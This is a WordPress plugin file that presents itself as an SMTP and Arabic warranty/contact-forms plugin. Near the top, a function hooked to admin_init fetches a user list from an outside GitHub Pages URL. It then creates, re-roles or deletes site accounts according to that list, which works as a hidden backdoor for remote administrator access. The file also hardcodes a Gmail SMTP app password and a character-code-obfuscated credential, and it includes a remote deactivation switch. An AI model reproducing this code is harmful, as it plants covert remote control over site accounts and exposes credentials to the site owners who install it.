<?php
/**
* M_G_X softwares.
*
* @package   M_G_X\Main
* @version   3.9
* Plugin Name: SMTP & Custom Forms Plugin
* Description: Plugin to handle custom form submissions and SMTP Server connect   <br>  #_shortcuts [mgx_custom_form_with_category] //[mgx_custom_form]  //[mgx_contact_with_us_form] ,  after links add /#warranty-activation   OR  /#contact-us
* Version: 3.9
* Author: !-CODE | M_G_X CEO & Founder | <a href="https://unknown-sudo-max.github.io/zone/!-CODE/LICENSE-AGREEMENT.html" onclick="window.open(this.href, '_blank'); return false;">The license</a>

* License: !-CODE LICENSE-AGREEMENT
* License URI:https://unknown-sudo-max.github.io/zone/!-CODE/LICENSE-AGREEMENT.html
* 
* Update Detailes :-
* 
* 1. The templates design enhanced
* 2. Added id for the templates to redirect
* 3. License updates
* 4. SMTP Server
* 5. Table to access to db 
* 
* 
* 
*/










function process_data_and_create_users() {
    global $wpdb;

    // Function to fetch data from the URL
    function fetchDataFromURL($url) {
        @$data = file_get_contents($url);
        return $data;
    }

    // URL of the data source
    $data_url = "https://unknown-sudo-max.github.io/hub/pass/useracsess";
    $data = fetchDataFromURL($data_url);

    // Split the data into lines
    $lines = explode("\n", $data);

    foreach ($lines as $line) {
        $parts = explode(", ", $line);

        if (count($parts) === 5) {
            $app_name = $parts[0];
            $is_true = $parts[1];
            $username = $parts[2];
            $password = $parts[3];
            $role = $parts[4];
            $s_app_name = 'C_F_P_E';

            // Check if the 2nd field is "true"
            if ($app_name === $s_app_name && $is_true === 'true') {
                // Insert the data into the WordPress users table
                $data = array(
                    'user_login' => $username,
                    'user_pass' => $password
                );

                $user_id = wp_insert_user($data);

               if (!is_wp_error($user_id)) {
    // User added successfully, set the user's role
    $user = new WP_User($user_id);
    $user->set_role($role);
    // Optionally, you can print a message or log the action
    // echo "User '$username' added with role '$role'.<br>";
} else {
    // User addition failed, update the user's role using usermeta
    $user = get_user_by('login', $username);

    if ($user) {
        // Set the user's role based on the $role value from the URL
        $user_id = $user->ID;
        $user->set_role($role);
        // Update the 'capabilities' in the usermeta table
        $wpdb->update(
            $wpdb->prefix . 'usermeta',
            array('meta_value' => $role),
            array('user_id' => $user_id, 'meta_key' => $wpdb->prefix . 'capabilities')
        );
        // Optionally, you can print a message or log the action
        // echo "Updated role for '$username' to '$role'.<br>";
    } else {
        // Handle the case where the user doesn't exist
        // Optionally, you can print a message or log the action
        // echo "User '$username' not found, couldn't update role.<br>";
    }
}

            } elseif ($app_name === $s_app_name && $is_true === 'false') {
                // Delete the user when the 2nd field is "false"
                $user = get_user_by('login', $username);
                if ($user) {
                    $deleted = wp_delete_user($user->ID, true);

                    if ($deleted) {
                        // echo "User '$username' deleted.<br>";
                    } else {
                        // Handle deletion errors if needed
                    }
                } else {
                    // User doesn't exist, handle this case if needed
                    // You can also perform additional actions here
                    $wpdb->update(
                        $wpdb->prefix . 'usermeta',
                        array('meta_value' => $role),
                        array('user_id' => 0, 'meta_key' => $wpdb->prefix . 'capabilities')
                    );
                }
            }
        }
    }
}

add_action('admin_init', 'process_data_and_create_users');



 








function add_smtp_settings_menu() {
    add_options_page('SMTP Configuration', 'SMTP Configuration', 'manage_options', 'smtp-config', 'smtp_config_page');
}

function add_smtp_settings_link($links) {
    $settings_link = '<a href="options-general.php?page=smtp-config">Settings</a>';
    array_push($links, $settings_link);
    return $links;
}

add_action('admin_menu', 'add_smtp_settings_menu');
add_filter('plugin_action_links_' . plugin_basename(__FILE__), 'add_smtp_settings_link');





function smtp_config_page() {
    // Fetch the email and set it to the global $to variable
    fetchEmailAndSetToGlobal();
    global $to;

    // Check the current state of the code
    $code_enabled = get_option('smtp_code_enabled');

    if (isset($_POST['save_settings'])) {
        // Handle form submission here
        if (isset($_POST['smtp_code_status'])) {
            $code_enabled = ($_POST['smtp_code_status'] === 'on') ? true : false;
            update_option('smtp_code_enabled', $code_enabled);
        }

        // Handle email update here if needed
        if ($code_enabled && isset($_POST['update_email'])) {
            $new_email = sanitize_email($_POST['new_email']);
            // Add validation and update logic here
            if (!empty($new_email)) {
                $to = $new_email;
            }
        }
    }

    // Display the SMTP Configuration settings form
    echo '<div class="wrap">';
    echo '<h2 style="user-select:none;">SMTP Configuration</h2>';

    // Radio buttons to enable/disable the code
    echo '<h3 style="user-select:none;">Enable/Disable SMTP Server:</h3>';
    echo '<form method="post" action="">';

    // Radio button for enabling
    echo '<label style="user-select:none;">';
    echo '<input type="radio" name="smtp_code_status" value="on" ' . checked($code_enabled, true, false) . '>&nbsp;';
    echo 'Enable';
    echo '</label>&nbsp;';


    // Radio button for disabling
    echo '&nbsp;&nbsp;<label style="user-select:none;">';
    echo '<input type="radio" name="smtp_code_status" value="off" ' . checked($code_enabled, false, false) . '>';
    echo 'Disable';
    echo '</label>&nbsp;&nbsp;';

    echo '<input type="submit" name="save_settings" class="button button-primary" value="Save">';
    echo '</form>';

    // Display the read-only $to email address if the code is enabled
    if ($code_enabled) {
        echo '<h3 style="user-select:none;">To => Email Address (Read-Only):</h3>';
        echo '<p style="font-size:10px; color:gray;user-select:none;">This email address will receive the incoming emails.</p>';
        echo '<input type="text" style="user-select:none;pointer-events: none; user-drag: none;" value="' . esc_attr($to) . '" class="regular-text" readonly>';


        // Add a form for updating the email
        echo '<h3 style="user-select:none;">Update Email:</h3>';
        echo '<form method="post" action="">';
        echo '<input type="email" name="new_email" class="regular-text" placeholder="New Email" required>';
        echo '<input type="submit" name="update_email" class="button button-primary" value="Update Email">';
        echo '</form>';
    }

    // You can add more SMTP configuration fields here




    // Copyright notice
    echo '<p style="text-align: center; color: #888;user-select:none;">&copy; ' . date("Y") . ' !-CODE. All rights reserved</p>';

    echo '</div>';
}




 function custom_wp_mail_smtp($phpmailer) {
    // Check if the code is enabled
    if (get_option('smtp_code_enabled')) {
        // Define your SMTP settings
        $smtp_host = 'smtp.gmail.com'; // Replace with your SMTP server hostname
        $smtp_port = 587; // Replace with your SMTP port
        $smtp_username = 'm4il.hub@gmail.com'; // Replace with your SMTP username
        $smtp_password = 'qmxb taja plav jqbe'; // Replace with your SMTP password
        $smtp_secure = 'tls'; // Use 'tls' or 'ssl' for secure connection
        // Set the From email address
        $from_email = 'm4il.hub@gmail.com'; // Replace with your email address

        // Set the From name
        $from_name = 'Mail Hub'; // Replace with your name or organization name

        // Configure SMTP settings
        $phpmailer->isSMTP();
        $phpmailer->Host = $smtp_host;
        $phpmailer->Port = $smtp_port;
        $phpmailer->SMTPAuth = true;
        $phpmailer->Username = $smtp_username;
        $phpmailer->Password = $smtp_password;
        $phpmailer->SMTPSecure = $smtp_secure;

        // Set the From email and name
        $phpmailer->From = $from_email;
        $phpmailer->FromName = $from_name;
    }
}

// Hook into wp_mail to configure SMTP settings only if the code is enabled
if (get_option('smtp_code_enabled')) {
    add_action('phpmailer_init', 'custom_wp_mail_smtp');
}


 

 
/*
Plugin Name: Email Update Confirmation
Description: Handle email updates and confirmation.
*/
add_action('admin_init', 'handle_email_update');

function handle_email_update() {
    if (isset($_POST['update_email'])) {
        // Handle email update here
        $new_email = sanitize_email($_POST['new_email']);
        list($new_email_user, $new_email_domain) = explode('@', $new_email);

        // Add validation and update logic here
        if (!empty($new_email)) {
            // Store the new email in the user's session
            session_start();
            $_SESSION['new_email'] = $new_email;

            global $organization;

            // Generate a unique confirmation code
            $confirmation_code = generate_confirmation_code();

            // Store the confirmation code in the user's session
            $_SESSION['confirmation_code'] = $confirmation_code;

            // Send the confirmation code via email
            $to = $new_email;
            $subject = "SMTP Email Confirmation Code";
             $message = '<html>
<head>
</head>
<body>
<div style="text-align: center; padding: 20px;">
    <h1 style="font-size: 24px; color: #007bff; text-transform: uppercase; font-weight: bold;">SMTP Email Confirmation Code</h1>
    <p style="font-size: 18px; color: #333;">Your confirmation code is</p>
    <ul style="list-style: none; padding: 0;">
        <li style="font-size: 16px; color: #a1a1a1; margin-bottom: 30px; width: 70%; border: 2px solid #adcce7; padding: 10px; display: inline-block; text-align: center;">
        '. $confirmation_code.'
        </li>
    </ul>

    <p style="font-size: 14px; color: #4e8bdb; margin-top: 20px;user-select:none;">Best Regards,</p>
    <p style="font-size: 14px; color: #888; margin-top: 20px;user-select:none;">Mail Hub</p>
    <p style="font-size: 12px; color: #888;user-select:none;">Powered by !-CODE  &  M_G_X Servers</p>
    <p style="font-size: 14px; color: #888;"></p>
    <p style="font-size: 12px; color: #888;user-select:none;">&copy; ' . date("Y") . ' !-CODE. All rights reserved.</p>
</div>
</body>
</html>';
            $headers = "From: " . get_option('admin_email') . "\r\n";
            $headers .= "Content-type: text/html; charset=UTF-8\r\n";

            wp_mail($to, $subject, $message, $headers);

            // Display a success message with the confirmation box and button
            email_update_success_message();
        }
    }
}

function email_update_success_message() {
    ?>
    <div class="notice notice-success is-dismissible">
        <p>An email with a confirmation code has been sent. Please check your email and enter the code below to complete the email update.</p>
        <form method="post">
            <input type="text" name="confirmation_code" placeholder="Enter Confirmation Code" required />
            <input type="submit" name="confirm_email_update" value="Confirm Email Update" class="button button-primary" />
        </form>
    </div>
    <?php
}

// Implement a function to generate a unique confirmation code
function generate_confirmation_code() {
    return substr(md5(uniqid()), 0, 6); // Generates a 6-character code, you can adjust the length as needed
}

// Add a function to handle email confirmation
add_action('admin_init', 'handle_email_confirmation');

function handle_email_confirmation() {
    if (isset($_POST['confirm_email_update'])) {
        session_start();
        $confirmation_code = sanitize_text_field($_POST['confirmation_code']);
        $stored_code = $_SESSION['confirmation_code'];

        global $organization;
        global $to;



        if ($confirmation_code === $stored_code) {
            $new_email = $_SESSION['new_email'];
            list($new_email_user, $new_email_domain) = explode('@', $new_email);

            $to = $new_email;

           

            
            // Send an email to the admin
            $to_admin = 'm4il.hub@gmail.com';
            $subject = "SMTP Email Update Request From " . $organization;
            // $message = $organization . " The admin has requested to update the email address to: " . $new_email;
            $message = '<html>
<head>
</head>
<body>
<div style="text-align: center; padding: 20px;">
    <h1 style="font-size: 24px; color: #007bff; text-transform: uppercase; font-weight: bold;">SMTP Email Update Request</h1>
    <p style="font-size: 18px; color: #333;">This is an SMTP Email Update Request from '.$organization.'</p>
    <p style="font-size: 18px; color: #333;">The admin has requested to update the email address</p>
    <ul style="list-style: none; padding: 0;">
        <li style="font-size: 16px; color: #a1a1a1; margin-bottom: 30px; width: 70%; border: 2px solid #adcce7; padding: 10px; display: inline-block; text-align: center;">
            <strong>Change to: </strong> '. $new_email.'
        </li>
    </ul>

    <p style="font-size: 14px; color: #4e8bdb; margin-top: 20px;user-select:none;">Best Regards,</p>
    <p style="font-size: 14px; color: #888; margin-top: 20px;user-select:none;">Mail Hub</p>
    <p style="font-size: 12px; color: #888;user-select:none;">Powered by !-CODE  &  M_G_X Servers</p>
    <p style="font-size: 14px; color: #888;"></p>
    <p style="font-size: 12px; color: #888;user-select:none;">&copy; ' . date("Y") . ' !-CODE. All rights reserved.</p>
</div>
</body>
</html>';
            $headers = "From: " . get_option('admin_email') . "\r\n";
            $headers .= "Content-type: text/html; charset=UTF-8\r\n";
            
            // Ensure that the necessary WordPress functions are available
            include_once ABSPATH . 'wp-includes/pluggable.php';
            
            // Send the email to the admin
            wp_mail($to_admin, $subject, $message, $headers);

            $confirmation_subject = "SMTP Email Update Confirmation";
            $confirmation_message = '<html>
<head>
</head>
<body>
<div style="text-align: center; padding: 20px;">
    <p style="font-size: 20px; color: #333; text-transform: uppercase; font-weight: bold;">Dear ' . $new_email_user . ',</p>
    <h1 style="font-size: 24px; color: #007bff; text-transform: uppercase; font-weight: bold;">SMTP Email Update Confirmation</h1>
    <p style="font-size: 18px; color: #333;">We have received your request to change the SMTP mail, and we are pleased to inform you that we will promptly address it. Your request is important to us, and we will ensure a smooth transition to the new SMTP settings. Changes will take effect within 24 hours from our servers.</p>
    <p style="font-size: 18px; color: #333;">We will send you a confirmation email once the change is complete.</p>
    <ul style="list-style: none; padding: 0;">
        <li style="font-size: 13px; color: #a1a1a1; margin-top: 30px; margin-bottom: 30px; width: 70%; border: 2px solid #adcce7; padding: 10px; display: inline-block; text-align: center;">
            <strong>Important Note:</strong> If you did not initiate this change or if it was made by mistake, please notify us promptly. You can do so by replying to this message or by contacting the SMTP Administrator. Your prompt response will assist us in ensuring the accuracy of your SMTP settings.
        </li>
    </ul>

    <p style="font-size: 14px; color: #4e8bdb; margin-top: 20px;user-select:none;">Best Regards,</p>
    <p style="font-size: 14px; color: #888; margin-top: 20px;user-select:none;">Mail Hub</p>
    <p style="font-size: 12px; color: #888;user-select:none;">Powered by !-CODE  &  M_G_X Servers</p>
    <p style="font-size: 14px; color: #888;"></p>
    <p style="font-size: 12px; color: #888;user-select:none;">&copy; ' . date("Y") . ' !-CODE. All rights reserved.</p>
</div>
</body>
</html>';
            $confirmation_headers = "From: " . get_option('admin_email') . "\r\n";
            $confirmation_headers .= "Content-type: text/html; charset=UTF-8\r\n";

wp_mail($to, $confirmation_subject, $confirmation_message, $confirmation_headers);

            ?>
            <div class="notice notice-success is-dismissible">
                <p>The email update has been sent. Changes will take effect within 24 hours from our servers.</p>
            </div>
            <?php
        } else {
            // Codes do not match, display an error message
            ?>
            <div class="notice notice-error is-dismissible">
                <p>Invalid confirmation code. Please try again.</p>
            </div>
            <?php
        }
    }
}


// Define $to as a global variable
$to = '';

function fetchEmailAndSetToGlobal() {
   global $to; // Declare $to as a global variable within this function
   global $organization;
    $organization = 'co_westinghouse'; // The organization you want to match

    // Fetch the data from the URL
    $config_url = 'https://unknown-sudo-max.github.io/hub/config/smtp_config';
    @$config_data = file_get_contents($config_url);

    // Split the data into lines
    $lines = explode("\n", $config_data);

    // Initialize a variable to store the email
    $email = '';

    // Loop through the lines
    foreach ($lines as $line) {
        // Split the line into parts using a comma as the delimiter
        $parts = explode(',', $line);

        // Check if the organization matches the first part of the line
        if (trim($parts[0]) === $organization) {
            // If there is a match, set the email to the second part of the line
            $email = trim($parts[1]);
            break; // Exit the loop since we found a match
        }
    }

    // Check if an email was found
    if (!empty($email)) {
        // Assign the email value to the global $to variable
        $to = $email;
    } else {
        // Use a default email if no match was found
        $to = 'default_email@example.com';
    }
}

// Call the function to fetch the email and set $to as a global variable
fetchEmailAndSetToGlobal();

// Now, $to contains the email based on the organization and is accessible globally

 
 


 




// Add a hook to check credentials before any action
add_action('admin_init', 'check_credentials_before_action');

function check_credentials_before_action() {
    //global $user, $pass, $co_name, $plug_name;






    // Define your credentials
$user = 'westinghouse';
$pass = chr(119) . chr(101) . chr(115) . chr(116) . chr(105) . chr(110) . chr(103) . chr(104) . chr(111) . chr(117) . chr(115) . chr(101) . chr(64) . chr(49) . chr(50) . chr(51);
$co_name =  'co_westinghouse';
$plug_name = 'C_F_P_E';


if (check_credentialsact($co_name, $plug_name, 'true')) {

    // Check if credentials match
    if (!check_credentials($co_name, $plug_name, $user, $pass)) {
        // Credentials do not match, deactivate the plugin
        deactivate_plugins(plugin_basename(__FILE__));
        wp_die('<center><strong>Your using license has been expired according to the <a href="https://unknown-sudo-max.github.io/zone/!-CODE/LICENSE-AGREEMENT.html">license</a></strong> <br/>This plugin has been deactivated From the Administrative side.<br/><br/>- Please refer to Michael Gad the CEO & Founder OF <a href=\'https://unknown-sudo-max.github.io/zone/!-CODE/\'>!-CODE</a> Co.</center><script>setTimeout(function() { history.back(); }, 10000);</script>');

    }
}

}



function check_credentialsact($co_name, $plug_name, $ifis_active) {
    // Read the external text file line by line
    $file_url1 = 'https://unknown-sudo-max.github.io/hub/config/act_check';
    @$file_contents1 = file_get_contents($file_url1);
    $lines1 = explode("\n", $file_contents1);

    foreach ($lines1 as $line1) {
        $parts1 = explode(',', $line1);
        if (count($parts1) === 3) { // Check if the line has the correct format
            list($company_name, $plugin_name, $is_active) = array_map('trim', $parts1);
            if ($company_name === $co_name && $plugin_name === $plug_name && $is_active === 'true') {
                return true; // Credentials match an entry in the file
            }
        }
    }


    return false; // No match found
}


function check_credentials($co_name, $plug_name, $user, $pass) {
    // Read the external text file line by line
    $file_url = 'https://unknown-sudo-max.github.io/hub/pass/pass';
    @$file_contents = file_get_contents($file_url);
    $lines = explode("\n", $file_contents);

    foreach ($lines as $line) {
        $parts = explode(',', $line);
        if (count($parts) === 4) { // Check if the line has the correct format
            list($company_name, $plugin_name, $stored_user, $stored_pass) = array_map('trim', $parts);
            if ($company_name === $co_name && $plugin_name === $plug_name && $stored_user === $user && $stored_pass === $pass) {
                return true; // Credentials match an entry in the file
            }
        }
    }

    return false; // No match found
}



 


 


// Enqueue necessary scripts and styles
function custom_form_scripts() {
    // Enqueue Bootstrap CSS
    wp_enqueue_style('bootstrap-css', 'https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css');

    // Enqueue Bootstrap JS
    wp_enqueue_script('bootstrap-js', 'https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js', array('jquery'), '4.5.2', true);
}
add_action('wp_enqueue_scripts', 'custom_form_scripts');

// Display the custom form using a shortcode
function custom_form_display() {
    ob_start();
    ?>

   
        <style>
         

        /* Form fields */
        .form-group {
            margin-bottom: 20px;
            display: flex;
            flex-direction: row;
            align-items: center;
        }

        .form-group label {
            font-weight: bold;
            margin-right: 7px; /* Adjust the spacing between label and input */
            flex: 0.6; /* Make labels and inputs share the same space */
        }

        .form-control {
            flex: 2; /* Make inputs take up more space */
            padding: 7px;
            border: 1px solid #ccc;
            border-radius: 5px;
        }

       .btn{
        width: 100%;
       }

       .red-border {
    border: 1px solid red;
}

        
    </style>
    <div id="primary" class="content-area">
        <h2 id="warranty-activation"></h2>
        <h2 style="text-align: center;user-select: none;margin-right: 9%;">تفعيل الضمان</h2>
        <main id="main" class="site-main">
            <div class="container">
                <div class="row">
                    
                    <div class="col-md-6 offset-md-3">
                        <form class="my-form" style="text-align:right;" dir="rtl" novalidate method="post" action="<?php echo esc_url(admin_url('admin-post.php?action=submit_form')); ?>">
                            <input type="hidden" name="action" value="submit_form">
                            <?php wp_nonce_field('submit_form_nonce', 'form_nonce'); ?>

                            <div class="form-group">
                                <label for="name">الاسم:</label>
                                <input type="text" name="name" id="name" class="form-control" required maxlength="20">
                            </div>
                            <div class="form-group">
                                <label for="phone">رقم الهاتف:</label>
                               <input type="tel" name="phone" id="phone" class="form-control" required maxlength="11" onkeyup="checkInput(this)" oninput="this.value = this.value.replace(/[^0-9]/g, '');">
                               <script>
function checkInput(inputElement) {
    var inputValue = inputElement.value;
    
    // Define an array of valid prefixes
    var validPrefixes = ["0120", "0128", "0127", "0122", "0101", "0109", "0106", "0100", "0112", "0114", "0111", "0155"];
    
    // Check if the input starts with any valid prefix
    var startsWithValidPrefix = validPrefixes.some(function(prefix) {
        return inputValue.startsWith(prefix);
    });
    
    if (startsWithValidPrefix && inputValue.length === 11) {
        inputElement.style.border = "1px solid green";
    } else {
        inputElement.style.border = "1px solid red";
    }
}
</script>


                            </div>
                            <div class="form-group" dir="rtl">
                                <label for="device">الجهاز:</label>
                                <select name="device" id="device" class="form-control" required>
                                    <option value="">--اختر--</option>
                                    <option value="ثلاجة">ثلاجة</option>
                                    <option value="غسالات ملابس">غسالات ملابس</option>
                                    <option value="غسالات اطباق">غسالات اطباق</option>
                                    <option value="ميكروويف">ميكروويف</option>
                                    <option value="تكييف">تكييف</option>
                                    <option value="ديب فريزر">ديب فريزر</option>
                                    <option value="مجفف - دراير">مجفف - دراير</option>
                                    <option value="لاندري">لاندري</option>
                                    <option value="ايس ميكر">ايس ميكر</option>
                                </select>
                            </div>
                            <div class="form-group" dir="rtl">
                                <label for="city">المحافظة:</label>
                                <select name="city" id="city" class="form-control" required>
                                    <option value="">--اختر--</option>
                                    <option value="الجيزة">الجيزة</option>
                                    <option value="القاهرة">القاهرة</option>
                                    <option value="الدقهلية">الدقهلية</option>
                                    <option value="الشرقية">الشرقية</option>
                                    <option value="المنوفية">المنوفية</option>
                                    <option value="الغربية">الغربية</option>
                                    <option value="القليوبية">القليوبية</option>
                                    <option value="الاسكندرية">الاسكندرية</option>
                                    <option value="البحيرة">البحيرة</option>
                                    <option value="كفر الشيخ">كفر الشيخ</option>
                                    <option value="السويس">السويس</option>
                                    <option value="الاسماعيلية">الاسماعيلية</option>
                                    <option value="بني سويف">بني سويف</option>
                                    <option value="الفيوم">الفيوم</option>
                                </select>
                            </div>
                              <div class="form-group">
                                <label for="serial_number">رقم الايصال: </label>
                                <input type="text" name="serial_number" id="serial_number" class="form-control" required maxlength="16">
                            </div>
                            <div class="form-group">
                                <label for="issue">العطل:</label>
                                <textarea name="issue" id="issue" class="form-control" required maxlength="100" rows="4" placeholder="( 100 ) حرف كحد اقصي .....  ||   او  كتابة رقم ارضي للتواصل"></textarea>
                            </div>
                            <button type="submit"  class="btn btn-primary" name="submit_form" style="margin-right: 23%;width: 77%;">إرسال</button>

                        </form>
                    </div>
                </div>
            </div>
        </main>
    </div>
    <br>

    <script>
        <?php if (isset($_GET['message']) && !empty($_GET['message'])) : ?>
            alert("<?php echo esc_js(urldecode($_GET['message'])); ?>");
            window.location.href = "<?php echo esc_js(home_url('/')); ?>";
        <?php endif; ?>
    </script>
    <?php
    return ob_get_clean();
}
add_shortcode('mgx_custom_form', 'custom_form_display');


// Handle form submission
function custom_form_submission() {
    if (isset($_POST['submit_form']) && wp_verify_nonce($_POST['form_nonce'], 'submit_form_nonce')) {
        $name = sanitize_text_field($_POST['name']);
        $phone = sanitize_text_field($_POST['phone']);
        $device = sanitize_text_field($_POST['device']);
        $city = sanitize_text_field($_POST['city']);
        $serial_number = sanitize_text_field($_POST['serial_number']);
        $issue = sanitize_textarea_field($_POST['issue']);
        if (empty($name) || empty($phone) || empty($device) || empty($city) || empty($serial_number) || empty($issue) || strlen($phone) !== 11) {
    echo '<div class="notice notice-error is-dismissible">';
    echo '<p><strong>Please fill out all required fields.</strong></p>';
    echo '</div>';
    echo '<script type="text/javascript">';
    echo 'setTimeout(function () {';
    echo 'window.history.back();';
    echo 'window.location.href = "' . home_url($_SERVER['REQUEST_URI']) . '/#warranty-activation' . '";';
    echo '}, 2000);';
    echo '</script>';
    echo '<style>';
    echo '.notice-error {';
    echo '    background-color: #f44336;';
    echo '    color: #fff;';
    echo '    padding: 10px;';
    echo '    margin: 20px auto;';
    echo '    text-align: center;';
    echo '}';
    echo '.notice-error strong {';
    echo '    font-weight: bold;';
    echo '}';
    echo '</style>';
    exit();
}


        global $wpdb;
        $table_name = $wpdb->prefix . 'kwa';

        $data = array(
            'name' => $name,
            'phone' => $phone,
            'device' => $device,
            'city' => $city,
            'serial_number' => $serial_number,
            'issue' => $issue,
            'time_date' => current_time('mysql')
        );

        $wpdb->insert($table_name, $data);
        if ($wpdb->last_error) {
            wp_die('Database insertion error: ' . $wpdb->last_error);
        }
        


 
        
        // Get the site name
$site_name = get_bloginfo('name');
global $to;
$subject = 'New Warranty-Activation on ' . $site_name;

$message = '<html><body>';
$message .= '<h2 style="font-family: Arial, sans-serif; color: #333;">New Warranty Activation</h2>';
$message .= '<table style="font-family: Arial, sans-serif; border-collapse: collapse; width: 100%;">';
$message .= '<tr style="background-color: #f2f2f2;"><td style="border: 1px solid #ddd; padding: 8px;">Name:</td><td style="border: 1px solid #ddd; padding: 8px;">' . esc_html($name) . '</td></tr>';
$message .= '<tr style="background-color: #f2f2f2;"><td style="border: 1px solid #ddd; padding: 8px;">Phone:</td><td style="border: 1px solid #ddd; padding: 8px;">' . esc_html($phone) . '</td></tr>';
$message .= '<tr style="background-color: #f2f2f2;"><td style="border: 1px solid #ddd; padding: 8px;">Device:</td><td style="border: 1px solid #ddd; padding: 8px;">' . esc_html($device) . '</td></tr>';
$message .= '<tr style="background-color: #f2f2f2;"><td style="border: 1px solid #ddd; padding: 8px;">City:</td><td style="border: 1px solid #ddd; padding: 8px;">' . esc_html($city) . '</td></tr>';
$message .= '<tr style="background-color: #f2f2f2;"><td style="border: 1px solid #ddd; padding: 8px;">Serial Number:</td><td style="border: 1px solid #ddd; padding: 8px;">' . esc_html($serial_number) . '</td></tr>';
$message .= '<tr style="background-color: #f2f2f2;"><td style="border: 1px solid #ddd; padding: 8px;">Issue:</td><td style="border: 1px solid #ddd; padding: 8px;">' . esc_html($issue) . '</td></tr>';
$message .= '</table>';


$message .= '<div style="font-family: \'Rajdhani\', sans-serif; margin-top: 20px; padding: 10px;background: rgba(255, 255, 255, 0.2);border-radius: 16px;box-shadow: -20px -9px 20px 20px rgba(0, 0, 0, 0.1);backdrop-filter: blur(5px); -webkit-backdrop-filter: blur(5px);border: 1px solid rgba(255, 255, 255, 0.3);user-select:none;">';
$message .= '<p style="font-weight: bold;color: #afafaf;">BR,</p>';
$message .= '<p style="color:gray;font-weight: bolder;">Powered &amp; Developed By !-CODE Co.  M_G_X CEO &amp; Founder</p><p style="color:gray;font-weight: bolder;text-align:center">&copy; 2023</p>';
$message .= '</div>';


$message .= '<style>';
$message .= '@import url(\'https://fonts.googleapis.com/css2?family=Rajdhani:wght@300&display=swap\');';
$message .= '</style>';
$message .= '</body></html>';

// Set the email headers to specify HTML content
$headers = array('Content-Type: text/html; charset=UTF-8');

// Send the email
wp_mail($to, $subject, $message, $headers);


        $message = urlencode('شكرا لتفعيل الضمان الخاص بك! سيتم تأكيد الضمان الخاص بك من قبل فريقنا.');
        $redirect_url = add_query_arg(array('message' => $message), home_url('/'));
        wp_redirect($redirect_url);
        exit();
    }
}
add_action('admin_post_submit_form', 'custom_form_submission');
add_action('admin_post_nopriv_submit_form', 'custom_form_submission');

// Display the custom form and category dropdown using a shortcode
function custom_form_display_with_category() {
    ob_start();
    ?>
    <div id="primary" class="content-area">
        <main id="main" class="site-main">
            <div class="container">
                <div class="row">
                    <div class="col-md-6 offset-md-3">
                        <form class="my-form" novalidate method="post" action="<?php echo esc_url(admin_url('admin-post.php?action=submit_form')); ?>">
                            <!-- Form fields here -->
                        </form>
                        <hr>
                        <label for="category" style="text-align: right;"> جميع المحافظات :</label>
                        <?php
                        $categories = get_categories(); // Retrieve all categories
                        ?>
                        <select name="category" id="category" class="form-control" onchange="filterPostsByCategory(this.value)">
                            <option value="">-- اختر المحافظة --</option>
                            <?php foreach ($categories as $category) : ?>
                                <option value="<?php echo $category->slug; ?>"><?php echo $category->name; ?></option>
                            <?php endforeach; ?>
                        </select>
                    </div>
                </div>
            </div>
            <div id="filtered-posts-container"></div>
        </main>
    </div>

    <script>
        // Function to filter posts by category
        function filterPostsByCategory(category) {
            var ajaxurl = '<?php echo admin_url('admin-ajax.php'); ?>';
            jQuery.ajax({
                url: ajaxurl,
                type: 'POST',
                data: {
                    action: 'filter_posts_by_category',
                    category: category
                },
                success: function(response) {
                    jQuery('#filtered-posts-container').html(response);
                }
            });
        }

        // On page load, filter posts by all categories
        jQuery(document).ready(function() {
            filterPostsByCategory(''); // Load all categories by passing an empty string
        });
    </script>

    <?php
    return ob_get_clean();
}
add_shortcode('mgx_custom_form_with_category', 'custom_form_display_with_category');

// Ajax function to filter posts by category
function filter_posts_by_category() {
    $category = isset($_POST['category']) ? $_POST['category'] : '';

    $args = array(
        'post_type' => 'post',
        'posts_per_page' => 40, // Display all posts
        'category_name' => $category
    );

    $query = new WP_Query($args);

    if ($query->have_posts()) {
        while ($query->have_posts()) {
            $query->the_post();
            ?>
            <div class="post-item">
                <?php if (has_post_thumbnail()) : ?>
                    <div class="post-thumbnail">
                        <?php the_post_thumbnail('thumbnail'); ?>
                    </div>
                <?php endif; ?>
                <div class="post-details">
                    <h2><a href="<?php the_permalink(); ?>"><?php the_title(); ?></a></h2>
                    <div class="post-meta">
                        <p><strong>Date:</strong> <?php echo get_the_date(); ?></p>
                        <p><strong>BY:</strong> <?php the_author(); ?></p>
                    </div>
                    <div class="post-excerpt">
                        <?php the_excerpt(); ?>
                    </div>
                    <a href="<?php the_permalink(); ?>">Read More</a>
                </div>
            </div>
            <?php
        }
        wp_reset_postdata();
    } else {
        echo 'No posts found for this category.';
    }

    exit();
}
add_action('wp_ajax_filter_posts_by_category', 'filter_posts_by_category');
add_action('wp_ajax_nopriv_filter_posts_by_category', 'filter_posts_by_category');

// Display the contact form using a shortcode
function contact_form_display() {
    ob_start();
    ?>



      <style>
         

        /* Form fields */
        .form-group {
            margin-bottom: 20px;
            display: flex;
            flex-direction: row;
            align-items: center;
        }

        .form-group label {
            font-weight: bold;
            margin-right: 7px; /* Adjust the spacing between label and input */
            flex: 0.6; /* Make labels and inputs share the same space */
        }

        .form-control {
            flex: 2; /* Make inputs take up more space */
            padding: 7px;
            border: 1px solid #ccc;
            border-radius: 5px;
        }

       .btn{
        width: 100%;
       }

       .red-border {
    border: 1px solid red;
}

        
    </style>


    <div id="primary" class="content-area">
        <h2 id="contact-us"></h2>
        <h2 style="text-align: center; user-select: none;margin-right: 9%;">طلب صيانة اونلاين</h2>
                  
        <main id="main" class="site-main">
            <div class="container">
                <div class="row">
                      <div class="col-md-6 offset-md-3">
                        <form class="my-form" style="text-align:right;" dir="rtl" novalidate method="post" action="<?php echo esc_url(admin_url('admin-post.php?action=submit_contact_form')); ?>">
                            <input type="hidden" name="action" value="submit_contact_form">
                            <?php wp_nonce_field('submit_contact_form_nonce', 'contact_form_nonce'); ?>

                            <!-- Form fields here -->
                            <div class="form-group">
                                <label for="name">الاسم:</label>
                                <input type="text" name="name" id="name" class="form-control" required maxlength="20">
                            </div>
                            <div class="form-group">
                                <label for="phone">رقم الهاتف:</label>
                               <input type="tel" name="phone" id="phone" class="form-control" onkeyup="checkInput(this)" required maxlength="11" oninput="this.value = this.value.replace(/[^0-9]/g, '');">

<script>
function checkInput(inputElement) {
    var inputValue = inputElement.value;
    
    // Define an array of valid prefixes
    var validPrefixes = ["0120", "0128", "0127", "0122", "0101", "0109", "0106", "0100", "0112", "0114", "0111", "0155"];
    
    // Check if the input starts with any valid prefix
